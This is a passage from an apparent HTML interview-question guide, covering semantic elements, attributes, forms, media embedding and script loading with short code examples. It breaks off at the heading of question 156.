`<nav>` marks a group of major navigation links, like the main menu, a table of contents or breadcrumbs.

```html
<nav aria-label="Main">
  <ul>
    <li><a href="/">Home</a></li>
    <li><a href="/blog">Blog</a></li>
  </ul>
</nav>
```

Screen reader users can jump straight to it. You don't need `<nav>` for every group of links, like a few links in the footer. If you have more than one `<nav>`, give each an `aria-label` so users can tell them apart.

### 64: What is the `<main>` element?

`<main>` wraps the main content of the page, the part that is unique to this page. Headers, footers, site navigation and sidebars that repeat on every page go outside it.

There should be only one visible `<main>` per page. It creates a `main` landmark, so screen reader users can skip straight to the content.

### 65: What is the difference between `<article>` and `<section>`?

`<article>` is a self-contained piece of content that would still make sense on its own, outside the page. Examples: a blog post, a news story, a product card, a comment.

`<section>` is a thematic group of content inside something bigger, usually with its own heading. Examples: the "Features" and "Pricing" parts of a landing page, chapters of a long article.

A simple test: could you put it in an RSS feed or share it alone? If yes, it is an `<article>`.

### 66: What is the `<aside>` element?

`<aside>` holds content that is related to the main content but not part of its main flow. Examples: a sidebar, a "related posts" box, a pull quote, a note.

On the page level it creates a `complementary` landmark. Don't use it just because something is placed on the side visually. Use it because of what the content is.

### 67: What is the difference between `<div>` and `<span>`?

Both are generic containers with no meaning. They are used when no semantic element fits, usually for styling or as a hook for JavaScript.

- `<div>` is a block-level container, used to group bigger parts of the page.
- `<span>` is an inline container, used for a part of text.

```html
<div class="card">
  <p>Price: <span class="price">$20</span></p>
</div>
```

### 68: What is the difference between block and inline elements?

Block elements (like `<div>`, `<p>`, `<h1>`, `<ul>`) start on a new line and take the full available width by default.

Inline elements (like `<span>`, `<a>`, `<strong>`, `<em>`) sit inside a line of text and only take the width of their content. Vertical margins and `width`/`height` don't work on them the same way.

Strictly speaking, "block" and "inline" are CSS `display` values. HTML itself uses "content categories" like flow content and phrasing content. But the terms are still used a lot in interviews.

### 69: What is the difference between `<strong>` and `<b>`?

`<strong>` means the text is important, serious or urgent: `<strong>Warning:</strong> this can't be undone.`

`<b>` means the text should stand out but without extra importance, like keywords in a summary or a product name in a review.

Both are bold by default. Pick the one that matches the meaning, and use CSS `font-weight` if you only want bold styling.

### 70: What is the difference between `<em>` and `<i>`?

`<em>` means stress emphasis, the kind that changes the meaning of a sentence: "I _never_ said that" vs "I never said _that_".

`<i>` is for text in a different voice or mood, like technical terms, foreign words, thoughts or ship names: `<i lang="fr">c'est la vie</i>`.

Both are italic by default.

### 71: What are `<small>` and `<mark>` used for?

`<small>` is for side comments and small print, like copyright text, legal notes or disclaimers. It is not meant just to make text smaller (use CSS for that).

`<mark>` highlights text because it is relevant in the current context, for example search terms in search results:

```html
<p>Results for "coffee": How to brew <mark>coffee</mark> at home</p>
```

### 72: What are `<code>`, `<pre>`, `<kbd>` and `<samp>`?

- `<code>`: a piece of computer code, like `<code>Array.map()</code>`.
- `<pre>`: preformatted text that keeps spaces and line breaks. Often used around `<code>` for code blocks.
- `<kbd>`: keyboard input, like `<kbd>Ctrl</kbd> + <kbd>C</kbd>`.
- `<samp>`: sample output from a program, like an error message.

```html
<pre><code>function add(a, b) {
  return a + b;
}</code></pre>
```

### 73: What is the difference between `<blockquote>`, `<q>` and `<cite>`?

- `<blockquote>`: a long quote shown as its own block. The `cite` attribute can hold the source URL.
- `<q>`: a short inline quote. Browsers add quotation marks automatically.
- `<cite>`: the title of a creative work, like a book, film or article. It is not for the name of a person.

```html
<blockquote cite="https://example.com/talk">
  <p>Simple things should be simple.</p>
</blockquote>
<p>
  As stated in <cite>The Pragmatic Programmer</cite>,
  <q>care about your craft</q>.
</p>
```

### 74: What is the `<abbr>` element?

`<abbr>` marks an abbreviation or acronym. You can put the full form in the `title` attribute, or better, write it out in the text the first time it is used:

```html
<p>
  The <abbr>WHATWG</abbr> (Web Hypertext Application Technology Working Group)
  maintains HTML.
</p>
<p><abbr title="Cascading Style Sheets">CSS</abbr> is used for styling.</p>
```

The `title` tooltip doesn't show on touch screens and isn't read by every screen reader, so don't rely on it alone.

### 75: What is the `<time>` element?

`<time>` represents a date, time or duration, with a machine-readable version in the `datetime` attribute:

```html
<p>Published <time datetime="2026-05-14">May 14, 2026</time></p>
<p>The meeting starts at <time datetime="14:30">2:30 PM</time></p>
<p>Cooking time: <time datetime="PT45M">45 minutes</time></p>
```

The text can be in any format for people, while `datetime` uses a standard format that search engines, scripts and browser tools can read.

### 76: What is the `<address>` element for?

`<address>` holds contact information for the nearest `<article>` or for the whole page: an email, phone number, social link or postal address of the author or owner.

```html
<footer>
  <address>
    Contact: <a href="mailto:hello@example.com">hello@example.com</a>
  </address>
</footer>
```

It is not for any random postal address in your content, like the address of a restaurant in a review.

### 77: What are `<figure>` and `<figcaption>`?

`<figure>` wraps self-contained content that is referenced from the main text, like an image, chart, code example or quote. `<figcaption>` gives it a caption.

```html
<figure>
  <img src="chart.png" alt="Bar chart of sales by month, peaking in December" />
  <figcaption>Figure 1: Sales in 2026</figcaption>
</figure>
```

The caption goes as the first or last child of `<figure>`.

### 78: How do you write comments in HTML?

```html
<!-- This is a comment -->
<!--
  Comments can span
  several lines
-->
```

Comments are not shown on the page, but anyone can see them with "View source", so never put passwords, keys or private notes in them. Comments cannot be nested.

### 79: What are character entities?

Entities are codes for characters that are reserved in HTML or hard to type. They start with `&` and end with `;`.

| Character | Named    | Numeric  |
| --------- | -------- | -------- |
| `<`       | `&lt;`   | `&#60;`  |
| `>`       | `&gt;`   | `&#62;`  |
| `&`       | `&amp;`  | `&#38;`  |
| `"`       | `&quot;` | `&#34;`  |
| `©`       | `&copy;` | `&#169;` |

With UTF-8 you can type most characters directly (like `©` or `€`), so you mainly need entities for `<`, `&` and quotes inside attributes.

### 80: How do you show the `<` character as text on a page?

Write `&lt;` instead. Otherwise the browser may think you are starting a tag.

```html
<p>Use the &lt;p&gt; element for paragraphs.</p>
```

This shows "Use the `<p>` element for paragraphs." The same goes for `&` which should be written as `&amp;`.

### 81: What is `&nbsp;`?

It is a non-breaking space. It looks like a normal space, but the browser won't break the line at that point and won't collapse it with other spaces.

It is useful to keep things together, like `10&nbsp;kg` or `Mr.&nbsp;Smith`. Don't use a row of `&nbsp;` to create spacing or indentation; use CSS for that.

### 82: What are global attributes?

Global attributes can be used on any HTML element. The common ones are:

- `id`, `class`, `style`
- `title`
- `lang`, `dir`, `translate`
- `hidden`, `inert`
- `tabindex`, `accesskey`, `autofocus`
- `contenteditable`, `spellcheck`, `draggable`
- `data-*`
- `popover`
- `role` and `aria-*` (from ARIA)
- Event handlers like `onclick`

### 83: What is the difference between `id` and `class`?

- `id` must be unique in the whole document. Use it for one specific element: link targets, connecting labels to inputs, ARIA references, or `getElementById`.
- `class` can be used on many elements, and one element can have many classes (`class="btn btn-primary"`). Use it mostly for styling and grouping.

In CSS, `#id` selectors have much higher specificity than `.class` selectors, which is one reason most teams style with classes.

### 84: What happens if two elements have the same `id`?

The HTML is invalid, but the browser won't show an error. Things just break in quiet ways:

- `getElementById` returns only the first match.
- `<label for>` and `aria-labelledby` point to the wrong element.
- `#id` links scroll to the first one.

This often happens when a component with a hard-coded `id` is rendered twice. In React you can use `useId()` to generate unique ids.

### 85: What is the `style` attribute?

It adds inline CSS to one element:

```html
<p style="color: red; font-weight: bold;">Error</p>
```

Inline styles are hard to reuse and override, they mix content with styling, and a strict Content Security Policy may block them. Use them rarely, for example for values set by JavaScript like `style="--progress: 40%"`.

### 86: What are the ways to add CSS to an HTML page?

1. External stylesheet (the usual way):

```html
<link rel="stylesheet" href="styles.css" />
```

2. Internal `<style>` block in the `<head>`:

```html
<style>
  body {
    font-family: system-ui, sans-serif;
  }
</style>
```

3. Inline `style` attribute on an element.

External files can be cached and shared between pages, so they are best for most CSS.

### 87: How do you add JavaScript to a page?

With the `<script>` element, either pointing to a file or with code inside:

```html
<script src="app.js" defer></script>

<script>
  console.log("Hello");
</script>

<script type="module" src="main.js"></script>
```

A `<script>` tag with `src` should be empty. If you add code between the tags, it is ignored.

### 88: Where should you put the `<script>` tag?

A plain `<script src>` blocks HTML parsing while the file downloads and runs. That is why the old advice was to put scripts at the end of `<body>`.

The modern way is to put them in `<head>` with `defer` (or use `type="module"`, which is deferred by default). The browser starts downloading early but runs the script only after the HTML is parsed, so the page isn't blocked.

### 89: What is the `<noscript>` element?

`<noscript>` holds content that is shown only when JavaScript is turned off or not supported.

```html
<noscript>
  <p>This app needs JavaScript to work. Please enable it in your browser.</p>
</noscript>
```

It is also used with tracking pixels and image fallbacks. It doesn't help when JavaScript is on but failed to load.

### 90: What is the `title` attribute and what are its limits?

`title` adds extra information that shows as a tooltip on mouse hover.

```html
<button title="Copy to clipboard">📋</button>
```

Limits:

- It doesn't show on touch devices.
- Keyboard users usually can't see it.
- Screen readers handle it in different ways.

So don't put important information only in `title`. In the example above, you'd also need `aria-label` or visible text.

### 91: What are `data-*` attributes?

They let you store custom data on HTML elements. The name must start with `data-`.

```html
<button data-product-id="42" data-color="red">Add to cart</button>
```

In JavaScript you read them through `dataset`, with the name changed to camelCase:

```js
const btn = document.querySelector("button");
console.log(btn.dataset.productId); // "42"
```

Values are always strings. They are also handy as CSS selectors and test hooks (like `data-testid`).

### 92: What does the `hidden` attribute do?

It hides the element. Browsers apply `display: none` to it, so it isn't shown and screen readers ignore it.

```html
<p id="message" hidden>Saved!</p>
```

Watch out: if your CSS sets `display: flex` (or anything else) on that element, it overrides `hidden` and the element shows. Many CSS resets add `[hidden] { display: none !important; }` for that reason. There is also `hidden="until-found"`, which hides content but lets the browser's find-in-page reveal it.

### 93: How do you add audio to a page?

```html
<audio controls src="podcast.mp3">Your browser does not support audio.</audio>
```

`controls` shows the browser's play, pause and volume controls. Without it, the audio is invisible and can only be played with JavaScript. The text inside is a fallback for very old browsers.

### 94: How do you add a video to a page?

```html
<video controls width="640" height="360" poster="preview.jpg">
  <source src="movie.webm" type="video/webm" />
  <source src="movie.mp4" type="video/mp4" />
  <track kind="captions" src="captions-en.vtt" srclang="en" label="English" />
  Your browser doesn't support HTML video.
</video>
```

The browser plays the first `<source>` it can handle. `<track>` adds captions.

### 95: What do the `controls`, `autoplay`, `muted`, `loop` and `poster` attributes do on `<video>`?

- `controls`: shows the built-in player controls.
- `autoplay`: tries to start playing as soon as possible.
- `muted`: starts with the sound off.
- `loop`: starts again from the beginning when it ends.
- `poster`: an image shown before the video starts.

They are boolean attributes (except `poster`), so their presence turns them on.

### 96: Why doesn't my video autoplay?

Browsers block autoplay with sound, because unexpected audio annoys users. A video can usually autoplay only if:

- It is `muted`, or
- The user has interacted with the site, or
- The site has enough media engagement (Chrome uses this).

On iPhones you also need `playsinline`, otherwise the video goes full screen. So for a background video use:

```html
<video autoplay muted loop playsinline src="bg.mp4"></video>
```

### 97: What is the `<source>` element used for?

It gives several options for a media resource, and the browser picks the first one it supports. It's used in `<video>`, `<audio>` and `<picture>`.

```html
<audio controls>
  <source src="song.ogg" type="audio/ogg" />
  <source src="song.mp3" type="audio/mpeg" />
</audio>
```

The `type` attribute lets the browser skip formats it can't play without downloading them.

### 98: What is the `<track>` element?

`<track>` adds timed text to `<video>` or `<audio>`, written in WebVTT format (`.vtt` files).

```html
<track
  kind="subtitles"
  src="subs-ka.vtt"
  srclang="ka"
  label="ქართული"
  default
/>
```

The `kind` can be `subtitles`, `captions`, `descriptions`, `chapters` or `metadata`. `default` turns that track on automatically. Captions are important for deaf and hard of hearing users and for people watching without sound.

### 99: What is an `<iframe>`?

An `<iframe>` embeds another HTML page inside the current page. It is used for things like YouTube videos, maps and payment forms.

```html
<iframe
  src="https://www.youtube.com/embed/VIDEO_ID"
  title="Product demo video"
  width="560"
  height="315"
  loading="lazy"
  allowfullscreen
>
</iframe>
```

Always add a `title` so screen reader users know what the frame contains.

### 100: How do you add a favicon?

```html
<link rel="icon" href="/favicon.ico" sizes="32x32" />
<link rel="icon" href="/icon.svg" type="image/svg+xml" />
<link rel="apple-touch-icon" href="/apple-touch-icon.png" />
```

The favicon is the small icon in the browser tab and bookmarks. If you don't add any `<link>`, browsers try `/favicon.ico` by default. An SVG icon scales well and can even react to dark mode with a media query inside it.

### 101: Is HTML case-sensitive?

Tag names and attribute names are not case-sensitive in HTML, so `<DIV>` and `<div>` are the same. The convention is to write them in lowercase.

Attribute values can be case-sensitive though. For example, `id` and `class` values are case-sensitive, so `class="Card"` and `class="card"` are different. In SVG and XHTML, case does matter (for example `viewBox` in SVG).

### 102: What are boolean attributes?

Boolean attributes are on when they are present and off when they are missing. The value doesn't matter.

```html
<input type="checkbox" checked />
<input disabled />
<video autoplay muted></video>
```

`disabled="false"` still disables the input, because the attribute is present. To turn it off, remove the attribute completely. Valid ways to write it are `disabled`, `disabled=""` or `disabled="disabled"`.

### 103: Do attribute values need quotes?

Not always. You can leave quotes off if the value has no spaces, quotes, `=`, `<`, `>` or backticks.

```html
<input type="text" name="email" />
```

But it is good practice to always use double quotes. It avoids bugs when a value later contains a space, and it is safer when values come from user data.

### 104: What are some HTML nesting rules?

Some elements can only contain certain content. Common rules:

- `<p>` can't contain block-level things like `<div>`, `<ul>` or another `<p>`.
- `<ul>` and `<ol>` can only have `<li>` as direct children.
- `<a>` and `<button>` can't contain other interactive elements (no button inside a link or link inside a link).
- Inline elements like `<span>` shouldn't contain `<div>`.
- `<table>` needs rows in `<tr>`, cells in `<td>`/`<th>`.

Breaking these rules produces a DOM that looks different from your markup.

### 105: What does the browser do with invalid HTML?

It doesn't show an error. The HTML spec defines exactly how to recover from every mistake, so all browsers build the same DOM from the same broken markup.

For example:

```html
<p>Hello <div>World</div></p>
```

The browser closes the `<p>` before the `<div>`, then sees `</p>` without an open `<p>` and creates an empty one. The DOM ends up as `<p>Hello </p><div>World</div><p></p>`. This is why invalid markup can cause odd spacing and hydration errors in frameworks.

### 106: How can you check if your HTML is valid?

Use the Nu HTML Checker from the W3C at `validator.w3.org/nu`. You can paste code, upload a file or enter a URL. There are also editor plugins and command-line tools like `html-validate`, and framework linters like `eslint-plugin-jsx-a11y` catch some problems in JSX.

Valid HTML is not a goal on its own, but the errors often point to real bugs like duplicate ids, wrong nesting or missing `alt` attributes.

### 107: What is the DOM?

The DOM (Document Object Model) is the tree of objects the browser builds from your HTML. Each element, text and comment becomes a node in that tree. JavaScript uses the DOM API to read and change the page:

```js
const title = document.querySelector("h1");
title.textContent = "New title";
```

When the DOM changes, the browser updates what's on screen.

### 108: What is the difference between HTML source and the DOM?

The HTML source is the text the server sent. The DOM is the live tree in memory. They can differ because:

- The parser fixes invalid markup (adds `<tbody>`, closes tags).
- JavaScript adds, removes or changes elements after load.
- The user types into form fields, which changes properties but not the source.

"View source" shows the original HTML. The Elements panel in DevTools shows the current DOM.

### 109: What is the `<base>` element?

`<base>` sets the base URL for all relative URLs in the document, and can set a default `target` for links.

```html
<head>
  <base href="https://example.com/docs/" target="_blank" />
</head>
```

Now `<a href="intro">` goes to `https://example.com/docs/intro`. There can be only one `<base>`, and it must come before other elements that use URLs. It is easy to cause bugs with it (for example `#anchor` links now point to the base URL), so use it with care.

### 110: What is the `<link>` element used for?

`<link>` connects the document to other resources. The `rel` attribute says what kind of link it is:

```html
<link rel="stylesheet" href="styles.css" />
<link rel="icon" href="/favicon.svg" />
<link
  rel="preload"
  href="/fonts/inter.woff2"
  as="font"
  type="font/woff2"
  crossorigin
/>
<link rel="canonical" href="https://example.com/page" />
<link rel="manifest" href="/manifest.webmanifest" />
<link rel="alternate" hreflang="de" href="https://example.com/de/" />
```

It is a void element and usually lives in `<head>`.

### 111: What is the meta description?

```html
<meta
  name="description"
  content="Easy recipes for busy weeknights, ready in 30 minutes or less."
/>
```

It is a short summary of the page. Search engines often show it under the title in results, so a good description can get more clicks. It doesn't directly affect rankings. Keep it around 150-160 characters and make it unique per page.

### 112: What is the `<body>` element?

`<body>` contains all the content of the page: text, images, links, forms and so on. There is only one `<body>` per document, and it comes right after `<head>`.

If you leave out `<html>`, `<head>` or `<body>` in your markup, the browser still creates them in the DOM.

### 113: What are `<sub>` and `<sup>`?

`<sub>` is subscript and `<sup>` is superscript. They are for cases where the position changes the meaning:

```html
<p>Water is H<sub>2</sub>O.</p>
<p>E = mc<sup>2</sup></p>
<p>1<sup>st</sup> place</p>
```

Don't use them only to move text up or down for looks.

### 114: What are `<del>`, `<ins>` and `<s>`?

- `<del>`: text that was removed from the document, like an edit.
- `<ins>`: text that was added to the document.
- `<s>`: text that is no longer correct or relevant but wasn't "deleted", like an old price.

```html
<p>Price: <s>$50</s> $35</p>
<p>The meeting is on <del>Monday</del> <ins>Tuesday</ins>.</p>
```

`<del>` and `<ins>` can have `cite` and `datetime` attributes to say why and when the change happened.

### 115: What does `<u>` mean in modern HTML?

`<u>` used to just mean "underline". Now it means text with a non-text annotation, like marking a misspelled word or a proper name in Chinese text.

Underlined text looks like a link to most users, so avoid `<u>` for styling. Use `<em>`, `<strong>` or CSS `text-decoration` depending on what you need.

### 116: What is the `<wbr>` element?

`<wbr>` (word break opportunity) tells the browser where it may break a long word or URL if needed.

```html
<p>https://example.com/<wbr />very/<wbr />long/<wbr />path</p>
```

If there's enough space, nothing happens. If not, the line breaks there instead of overflowing.

### 117: What is the `<template>` element?

`<template>` holds HTML that is not rendered when the page loads. JavaScript can clone its content and insert it later.

```html
<template id="row">
  <li class="item"><span class="name"></span></li>
</template>

<script>
  const tpl = document.getElementById("row");
  const clone = tpl.content.cloneNode(true);
  clone.querySelector(".name").textContent = "New item";
  document.querySelector("ul").append(clone);
</script>
```

Images in a template don't load and scripts in it don't run until you insert the cloned content.

### 118: What is the `<dialog>` element?

`<dialog>` is a built-in element for dialog boxes and modals.

```html
<dialog id="confirm">
  <p>Delete this file?</p>
  <form method="dialog">
    <button value="cancel">Cancel</button>
    <button value="delete">Delete</button>
  </form>
</dialog>

<button onclick="document.getElementById('confirm').showModal()">Delete</button>
```

`showModal()` opens it as a modal: the rest of the page becomes inert, focus moves into the dialog and Esc closes it. A form with `method="dialog"` closes the dialog when submitted.

### 119: What are `<details>` and `<summary>`?

They create a disclosure widget, content that the user can show and hide, with no JavaScript.

```html
<details>
  <summary>What is your refund policy?</summary>
  <p>You can return items within 30 days.</p>
</details>
```

`<summary>` is the clickable label. Add the `open` attribute to make it open by default. It works with keyboard and screen readers out of the box, which makes it a good choice for FAQs.

### 120: What is the difference between `<progress>` and `<meter>`?

- `<progress>` shows how far a task has gone, like a file upload. Without `value` it shows an "in progress" animation.
- `<meter>` shows a measurement within a known range, like disk usage, a password strength score or a rating.

```html
<label>Upload: <progress value="70" max="100">70%</progress></label>
<label
  >Disk usage: <meter value="0.8" min="0" max="1" high="0.9">80%</meter></label
>
```

### 121: What is the `<output>` element?

`<output>` shows the result of a calculation or user action.

```html
<form oninput="total.value = Number(a.value) + Number(b.value)">
  <input type="number" id="a" value="1" /> +
  <input type="number" id="b" value="2" /> =
  <output name="total" for="a b">3</output>
</form>
```

The `for` attribute lists the ids of the inputs that affect the result. Screen readers may announce changes to an `<output>`, since it acts like a live region in many browsers.

### 122: What is `<datalist>`?

`<datalist>` gives suggestions for an `<input>`, while still letting the user type anything.

```html
<label for="browser">Browser</label>
<input id="browser" name="browser" list="browsers" />
<datalist id="browsers">
  <option value="Chrome"></option>
  <option value="Firefox"></option>
  <option value="Safari"></option>
</datalist>
```

It is simple autocomplete with no JavaScript. The look of the suggestion list can't be styled much and differs between browsers.

### 123: What is the `<canvas>` element?

`<canvas>` is a drawing area that you draw on with JavaScript, pixel by pixel.

```html
<canvas id="c" width="300" height="150">A red square</canvas>
<script>
  const ctx = document.getElementById("c").getContext("2d");
  ctx.fillStyle = "red";
  ctx.fillRect(10, 10, 100, 100);
</script>
```

It is used for charts, games, image editing and with WebGL or WebGPU for 3D. The content isn't in the DOM, so screen readers can't read it. You need to provide a text alternative.

### 124: How do you use SVG in HTML?

You can put SVG directly in your HTML:

```html
<svg width="24" height="24" viewBox="0 0 24 24" aria-hidden="true">
  <circle cx="12" cy="12" r="10" fill="currentColor" />
</svg>
```

Or load it as an image with `<img src="icon.svg" alt="...">`. Inline SVG can be styled with CSS and changed with JavaScript. An SVG in `<img>` is cached separately but you can't style its insides from the page.

### 125: What is the `<picture>` element?

`<picture>` lets you give the browser several image sources and it picks the best one.

```html
<picture>
  <source srcset="photo.avif" type="image/avif" />
  <source srcset="photo.webp" type="image/webp" />
  <img src="photo.jpg" alt="Sunset over the sea" width="1200" height="800" />
</picture>
```

The browser uses the first `<source>` that matches. The `<img>` inside is required: it is the fallback and the element that is actually shown, so `alt`, `width` and `height` go on it.

### 126: What are `<embed>` and `<object>`?

Both embed external content. They were used a lot for plugins like Flash and Java, which are gone now.

Today they are rarely used. `<object>` can still show a PDF or SVG with fallback content inside, but `<iframe>`, `<img>`, `<video>` and `<audio>` cover almost every use case.

### 127: What are some deprecated HTML elements?

Elements that you should not use anymore:

- `<font>`, `<center>`, `<big>`, `<strike>`, `<tt>`: styling, now done with CSS
- `<marquee>`, `<blink>`: moving or blinking text
- `<frame>`, `<frameset>`, `<noframes>`: old frame layouts
- `<acronym>`: use `<abbr>`
- `<applet>`: Java applets

Attributes like `align`, `bgcolor`, `border` on tables and `width` on `<td>` are also obsolete. Use CSS.

### 128: What is the `<search>` element?

`<search>` is a newer element (supported in all major browsers since late 2023) that wraps a search or filter form. It creates the `search` landmark, which used to need `role="search"`.

```html
<search>
  <form action="/search">
    <label for="q">Search articles</label>
    <input id="q" name="q" type="search" />
    <button>Search</button>
  </form>
</search>
```

### 129: What is the `<menu>` element?

`<menu>` is a semantic alternative to `<ul>` for a list of commands, like toolbar buttons.

```html
<menu>
  <li><button>Copy</button></li>
  <li><button>Paste</button></li>
</menu>
```

Browsers treat it just like `<ul>`. It is not a dropdown menu and has no special behavior.

### 130: What is the `<data>` element?

`<data>` links content to a machine-readable value:

```html
<ul>
  <li><data value="SKU-1042">Blue running shoes</data></li>
</ul>
```

Scripts or other tools can read the `value`, while users see the friendly text. For dates and times, use `<time>` instead.

### 131: What is the `<ruby>` element?

`<ruby>` adds small annotations above or next to text, mainly used for pronunciation of East Asian characters.

```html
<ruby>漢<rt>kan</rt>字<rt>ji</rt></ruby>
```

`<rt>` holds the annotation text. `<rp>` can add parentheses for browsers that don't support ruby.

### 132: What are `<bdi>` and `<bdo>`?

They deal with text direction when mixing left-to-right and right-to-left languages.

- `<bdi>` isolates text with an unknown direction, like a username from a database, so it doesn't mess up the text around it.
- `<bdo dir="rtl">` forces a direction, overriding the normal rules.

```html
<p>User <bdi>إيان</bdi>: 3 posts</p>
```

### 133: What is the `dir` attribute?

`dir` sets the text direction of an element:

- `ltr`: left to right (English, Georgian)
- `rtl`: right to left (Arabic, Hebrew)
- `auto`: the browser guesses from the content

```html
<html lang="ar" dir="rtl"></html>
```

Set it on `<html>` for the whole page. Use `dir="auto"` on inputs and user-generated content where the language isn't known.

### 134: What is `contenteditable`?

It makes any element editable by the user, like a text field.

```html
<div contenteditable="true">You can edit this text.</div>
```

Rich text editors are built on top of it. There is also `contenteditable="plaintext-only"`, which allows editing but blocks formatting like bold. Editable content isn't part of a form, so you have to read it with JavaScript.

### 135: What is `tabindex`?

`tabindex` controls whether an element can get keyboard focus and in what order.

- `tabindex="0"`: the element can be focused and is in the normal Tab order, based on its position in the DOM.
- `tabindex="-1"`: the element can be focused with JavaScript (`el.focus()`) but is skipped by Tab.
- Positive values (`1`, `2`...): put the element first in the Tab order. Avoid these.

Links, buttons and form fields are already focusable, so you don't need `tabindex` on them.

### 136: What is the `spellcheck` attribute?

It turns the browser spell checker on or off for editable content:

```html
<textarea spellcheck="true"></textarea>
<input name="username" spellcheck="false" />
```

Turn it off for things like usernames, codes and email addresses where red underlines aren't helpful.

### 137: What is the `translate` attribute?

`translate="no"` tells translation tools (like the browser's built-in translator) not to translate that content.

```html
<p>Install it with <code translate="no">npm install react</code>.</p>
<span translate="no">Acme Cloud</span>
```

Use it for brand names, code and other text that should stay the same in every language.

### 138: Can you set `lang` on parts of a page?

Yes. `lang` works on any element, so you can mark parts written in another language:

```html
<html lang="en">
  ...
  <p>The French say <span lang="fr">bon appétit</span> before eating.</p>
</html>
```

Screen readers switch pronunciation for that part, and spell checkers use the right dictionary.

### 139: What does the `download` attribute on a link do?

It tells the browser to download the file instead of opening it.

```html
<a href="/files/report-2026.pdf" download>Download report</a>
<a href="/files/r.pdf" download="annual-report.pdf">Download</a>
```

The value, if given, is the suggested file name. It only works for same-origin URLs, `blob:` and `data:` URLs. For files on other domains, the browser ignores it and the server needs to send a `Content-Disposition: attachment` header.

### 140: What does the `autocomplete` attribute do?

It tells the browser what kind of data a field expects, so it can fill it in from saved data, or tells it not to.

```html
<input name="email" type="email" autocomplete="email" />
<input name="name" autocomplete="name" />
<input name="pwd" type="password" autocomplete="current-password" />
<input name="promo" autocomplete="off" />
```

Correct values make forms much faster to fill, especially on phones. It also helps password managers.

### 141: What does the `autofocus` attribute do?

It focuses the element when the page or dialog loads.

```html
<input name="q" type="search" autofocus />
```

Use it carefully. It can confuse screen reader users, because the page jumps to the middle of the content, and on phones it opens the keyboard right away. It works well inside a `<dialog>` to focus the first field.

### 142: What do `min`, `max` and `step` do on inputs?

They limit the allowed values on `number`, `range` and date/time inputs.

```html
<input type="number" name="qty" min="1" max="10" step="1" value="1" />
<input type="range" name="volume" min="0" max="100" step="5" />
<input type="date" name="checkin" min="2026-01-01" max="2026-12-31" />
```

The browser blocks submitting values outside the range, and the up/down arrows move by `step`.

### 143: What do `minlength` and `maxlength` do?

They set the minimum and maximum number of characters in text inputs and `<textarea>`.

```html
<input name="username" minlength="3" maxlength="20" required />
```

`maxlength` stops the user from typing more characters. `minlength` is checked when the form is submitted. An empty field isn't checked by `minlength` unless it's also `required`.

### 144: What does the `pattern` attribute do?

`pattern` checks the value against a regular expression on submit.

```html
<label for="zip">ZIP code (5 digits)</label>
<input id="zip" name="zip" pattern="[0-9]{5}" required />
```

The pattern must match the whole value; you don't need `^` and `$`. Explain the expected format in the label or a hint, because the browser's default error message doesn't say what the pattern is.

### 145: What does the `multiple` attribute do?

It allows more than one value:

- On `<select>`: the user can pick several options.
- On `<input type="file">`: the user can pick several files.
- On `<input type="email">`: the user can enter several emails separated by commas.

```html
<input type="file" name="photos" multiple accept="image/*" />
```

### 146: How do you let users upload files?

Use `<input type="file">`, and make sure the form uses `POST` and `enctype="multipart/form-data"`:

```html
<form action="/upload" method="post" enctype="multipart/form-data">
  <label for="avatar">Profile photo</label>
  <input id="avatar" name="avatar" type="file" accept="image/png, image/jpeg" />
  <button>Upload</button>
</form>
```

`accept` filters which files the picker shows, but it's only a hint. Always check the file type and size on the server.

### 147: What is `<input type="hidden">`?

A field that isn't shown to the user but is sent with the form.

```html
<input type="hidden" name="productId" value="42" />
<input type="hidden" name="csrf_token" value="abc123" />
```

It is used for ids, CSRF tokens and similar data. "Hidden" doesn't mean secret: anyone can see and change it in DevTools, so never trust it on the server without checking.

### 148: What is the `enctype` attribute on a form?

`enctype` sets how form data is encoded for `POST` requests:

- `application/x-www-form-urlencoded` (default): `name=Ana&age=28`
- `multipart/form-data`: needed for file uploads
- `text/plain`: rarely used, mostly for debugging

If you upload files without `multipart/form-data`, only the file name is sent, not the file.

### 149: What is the robots meta tag?

It tells search engine crawlers how to handle the page:

```html
<meta name="robots" content="noindex, nofollow" />
```

- `noindex`: don't show this page in search results.
- `nofollow`: don't follow links on this page.

It is often used for login pages, thank-you pages and staging sites. For the crawler to see this tag, the page must not be blocked in `robots.txt`.

### 150: What are the roles of HTML, CSS and JavaScript?

- **HTML** describes the structure and meaning of the content: headings, text, images, links, forms.
- **CSS** controls how it looks: colors, layout, fonts, animations.
- **JavaScript** adds behavior: reacting to clicks, loading data, updating the page.

A good page works in that order. The HTML alone should give usable content, CSS makes it look good, and JavaScript makes it better. This approach is called progressive enhancement.

## Moderate Questions (151-300)

### 151: What does the browser do when it loads an HTML page?

In short:

1. It downloads the HTML and decodes the bytes into characters using the charset.
2. The parser turns the text into tokens and builds the DOM tree.
3. When it finds CSS, it downloads it and builds the CSSOM.
4. When it finds a normal `<script>`, it stops parsing, downloads and runs it, then continues.
5. The DOM and CSSOM are combined into a render tree.
6. Layout calculates sizes and positions.
7. Paint and compositing draw the pixels on the screen.

At the same time, a preload scanner looks ahead in the HTML to start downloading images, scripts and styles early.

### 152: Why does a normal `<script>` tag block parsing?

A script can change the document while it is being parsed, for example with `document.write()`, or it can read elements that come before it. So the parser has to stop, wait for the script to download and run, and only then continue.

If the script is in `<head>` and the file is slow, the user sees a blank page the whole time. That's why you use `defer`, `async` or `type="module"` for most scripts.

### 153: What is the difference between `async` and `defer`?

Both download the script without blocking the parser. The difference is when it runs:

- `defer`: runs after the HTML is fully parsed, just before `DOMContentLoaded`, in the order the scripts appear in the document.
- `async`: runs as soon as it finishes downloading, which can be before or after parsing ends. The order between async scripts isn't guaranteed.

```html
<script src="app.js" defer></script>
<script src="analytics.js" async></script>
```

Use `defer` for your app code, which usually needs the DOM and depends on other scripts. Use `async` for independent scripts like analytics. For classic scripts, both attributes only work when the script has a `src`. On inline classic scripts they are ignored.

### 154: How do `type="module"` scripts behave?

```html
<script type="module" src="main.js"></script>
```

Module scripts:

- Are deferred by default (you can add `async` to run them as soon as they're ready).
- Can use `import` and `export`.
- Run in strict mode.
- Have their own scope, so top-level variables don't become globals.
- Are fetched with CORS, so cross-origin modules need the right CORS headers.
- Run only once, even if included twice.

### 155: What is the `nomodule` attribute?

```html
<script type="module" src="modern.js"></script>
<script nomodule src="legacy.js"></script>
```

Browsers that support modules ignore scripts with `nomodule`. Old browsers that don't understand modules skip the `type="module"` script and run the `nomodule` one. It was used to send smaller modern bundles to new browsers and a transpiled bundle to old ones. Today every current browser supports modules, so most projects don't need it anymore.

### 156: Why is CSS render-blocking?

